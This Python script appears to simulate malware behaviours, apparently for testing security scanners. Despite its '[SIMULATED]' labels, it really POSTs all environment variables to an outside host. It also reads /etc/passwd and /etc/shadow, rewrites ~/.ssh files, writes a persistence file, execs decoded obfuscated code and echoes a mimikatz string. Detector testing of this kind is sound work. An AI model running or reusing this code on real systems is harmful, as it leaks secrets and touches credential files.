import base64
import getpass
import http.client
import json
import os
import platform


def send_https_post_request(called_from: str, print_logs: bool) -> None:
    """
    Simulate exfiltration of environment variables via HTTPS POST request.
    """
    host = "www.wikipedia.com"
    try:
        connection = http.client.HTTPSConnection(host, timeout=3)
        data = {
            "text": f"Sending data through HTTPS from: {called_from}. Found environment variables: {dict(os.environ)}"
        }
        json_data = json.dumps(data)
        connection.request("POST", "/post", json_data, headers={"Host": host, "Content-Type": "application/json"})
        response = connection.getresponse()
        if print_logs:
            print(f"[SIMULATED] HTTPS POST sent, response: {response.status}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] HTTPS POST failed: {e}")


def access_ssh_keys(called_from: str, print_logs: bool) -> None:
    """
    Simulate access and modification of SSH keys in ~/.ssh directory.
    """
    ssh_keys_directory_path = os.path.join(os.path.expanduser('~'), ".ssh")
    try:
        if os.path.isdir(ssh_keys_directory_path):
            files_in_ssh_keys_directory = os.listdir(ssh_keys_directory_path)
            for file_name in files_in_ssh_keys_directory:
                full_file_path = os.path.join(ssh_keys_directory_path, file_name)
                try:
                    with open(full_file_path, "r", encoding="utf-8", errors="ignore") as f:
                        original_file_data = f.read()
                    with open(full_file_path, "a", encoding="utf-8") as f:
                        f.write(f"\n[SIMULATED] Writing to files in ~/.ssh from: {called_from}")
                    with open(full_file_path, "w", encoding="utf-8") as f:
                        f.write(original_file_data)
                except Exception as file_error:
                    if print_logs:
                        print(f"[SIMULATED] Could not process {file_name}: {file_error}")
            if print_logs:
                print(f"[SIMULATED] Files in ssh keys directory: {files_in_ssh_keys_directory}")
        else:
            if print_logs:
                print("[SIMULATED] Could not locate ssh key directory.")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in access_ssh_keys: {e}")


def read_file_and_log(file_to_read: str, called_from: str, print_logs: bool) -> None:
    """
    Simulate reading a sensitive file and logging the number of lines.
    """
    try:
        if os.path.isfile(file_to_read):
            with open(file_to_read, "r", encoding="utf-8", errors="ignore") as f:
                file_lines = f.readlines()
            if print_logs:
                print(f"[SIMULATED] Read {file_to_read} from: {called_from}. Lines: {len(file_lines)}")
        else:
            if print_logs:
                print(f"[SIMULATED] File not found: {file_to_read}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in read_file_and_log({file_to_read}): {e}")


def access_passwords(called_from: str, print_logs: bool) -> None:
    """
    Simulate access to /etc/passwd and /etc/shadow files.
    """
    password_file = os.path.join(os.path.abspath(os.sep), "etc", "passwd")
    shadow_password_file = os.path.join(os.path.abspath(os.sep), "etc", "shadow")
    try:
        read_file_and_log(password_file, called_from, print_logs)
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in access_passwords (passwd): {e}")
    try:
        read_file_and_log(shadow_password_file, called_from, print_logs)
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in access_passwords (shadow): {e}")


def exfiltrate_data_via_dns(called_from: str, print_logs: bool) -> None:
    """
    Simulate DNS exfiltration by logging the action.
    """
    try:
        fake_domain = f"data-leak-{getpass.getuser()}-{called_from}.example.com"
        if print_logs:
            print(f"[SIMULATED] Exfiltrating data via DNS to {fake_domain}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in exfiltrate_data_via_dns: {e}")


def simulate_persistence(called_from: str, print_logs: bool) -> None:
    """
    Simulate persistence by writing a fake crontab/autorun entry to a file.
    """
    persistence_file = os.path.join(os.path.expanduser('~'), "persistence_simulation.txt")
    try:
        with open(persistence_file, "a", encoding="utf-8") as f:
            f.write(f"Simulated persistence from {called_from}\n")
        if print_logs:
            print(f"[SIMULATED] Persistence written to {persistence_file}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in simulate_persistence: {e}")


def harvest_installed_packages(called_from: str, print_logs: bool) -> None:
    """
    Simulate harvesting installed packages by listing them.
    """
    try:
        import importlib.metadata
        packages = list(importlib.metadata.distributions())
        package_names = [p.metadata['Name'] for p in packages if 'Name' in p.metadata]
        if print_logs:
            print(f"[SIMULATED] Installed packages from {called_from}: {package_names}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Could not list installed packages: {e}")


def collect_system_info(called_from: str, print_logs: bool) -> None:
    """
    Simulate collection of system information.
    """
    try:
        info = {
            "hostname": platform.node(),
            "os": platform.platform(),
            "user": getpass.getuser(),
        }
        if print_logs:
            print(f"[SIMULATED] System info from {called_from}: {info}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in collect_system_info: {e}")


def simulate_obfuscated_code(called_from: str, print_logs: bool) -> None:
    """
    Simulate execution of obfuscated code (for demonstration only).
    """
    try:
        # Decodes to: print("Obfuscated simulation: Successfully decoded from base64")
        obfuscated = b'cHJpbnQoIk9iZnVzY2F0ZWQgc2ltdWxhdGlvbjogU3VjY2Vzc2Z1bGx5IGRlY29kZWQgZnJvbSBiYXNlNjQiKQ=='
        decoded = base64.b64decode(obfuscated).decode('utf-8')
        exec(decoded, {'__builtins__': __builtins__})
        if print_logs:
            print(f"[SIMULATED] Obfuscated code executed from: {called_from}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in simulate_obfuscated_code: {e}")


def simulate_code_from_binary(called_from: str, print_logs: bool) -> None:
    """
    Simulate execution of code extracted from a binary-like data blob (for demonstration only).
    """
    try:
        # This decodes to: print("Obfuscated simulation: Successfully decoded from binary data")
        binary_blob = b'\x70\x72\x69\x6e\x74\x28\x22\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x73\x69\x6d\x75\x6c\x61\x74\x69\x6f\x6e\x3a\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x20\x64\x65\x63\x6f\x64\x65\x64\x20\x66\x72\x6f\x6d\x20\x62\x69\x6e\x61\x72\x79\x20\x64\x61\x74\x61\x22\x29'
        code_str = binary_blob.decode('utf-8')
        exec(code_str, {'__builtins__': __builtins__})
        if print_logs:
            print(f"[SIMULATED] Code from binary data executed from: {called_from}")
    except Exception as e:
        if print_logs:
            print(f"[SIMULATED] Exception in simulate_code_from_binary: {e}")


simulated_techniques = [
  send_https_post_request,
  access_passwords,
  exfiltrate_data_via_dns,
  simulate_persistence,
  harvest_installed_packages,
  collect_system_info,
  simulate_obfuscated_code,
  simulate_code_from_binary,
]


def main():
  os.system("echo ' -c \"!mimikatz\'")
  try:
    [f("main function", True) for f in simulated_techniques]
  except Exception as e:
    print(f"An error occurred while executing simulated techniques: {e}")


if __name__ == "__main__":
  main()
